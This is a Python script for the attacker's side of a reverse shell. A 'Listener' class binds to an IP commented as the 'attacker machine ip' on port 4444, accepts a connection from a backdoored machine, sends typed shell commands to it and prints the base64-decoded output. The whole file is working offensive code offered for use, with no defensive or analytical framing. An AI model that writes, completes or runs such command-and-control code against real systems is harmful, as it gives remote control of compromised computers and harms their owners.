import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for the incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            json_data = json_data + self.connection.recv(1024).decode()
            if json_data:
                try:
                    # Decode the Base64 encoded string to bytes
                    encoded_data = json.loads(json_data)
                    data = base64.b64decode(encoded_data)
                    # Decode bytes object as UTF-8 string and strip leading/trailing whitespace
                    data_str = data.decode('utf-8').strip()
                    return data_str
                except json.JSONDecodeError:
                    print("[!] Received data is not in valid JSON format.")
            else:
                print("[!] No data received.")
            return None
    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            if result:
                print(result)  # Directly use the received data as a string

my_listener = Listener("192.168.254.128", 4444) #attacker machine ip
my_listener.run()
